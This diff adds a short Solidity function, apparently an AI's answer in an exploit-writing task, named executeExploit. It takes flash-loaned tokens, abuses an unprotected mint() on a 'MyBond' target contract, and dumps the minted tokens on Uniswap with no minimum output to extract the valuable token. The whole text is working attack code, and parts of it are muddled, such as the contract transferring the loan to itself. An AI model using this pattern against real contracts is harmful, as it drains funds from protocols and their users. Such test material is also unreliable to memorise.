@@ -1,0 +1,29 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by receiving the flash loaned amount of valuableToken
+    valuableToken.transfer(address(this), amount);
+    
+    uint256 tokenAmountToMint = amount; // Adjust this based on your strategy
+    // Mint new tokens to our contract
+    IMyBond(target).mint(address(this), tokenAmountToMint);
+    
+    // Now, swap the minted tokens to acquire valuableToken
+    address[] memory path = new address[](2);
+    path[0] = target; // MyBond token
+    path[1] = address(valuableToken); // WETH or valuable token
+
+    // Use Uniswap to swap the minted MyBond tokens for valuable tokens
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        tokenAmountToMint,
+        0, // Accept any amount of valuable token
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
+    console.log("Final valuable balance after swaps: ", currentValuableBalance);
+}
+</executeExploitCode>
+```
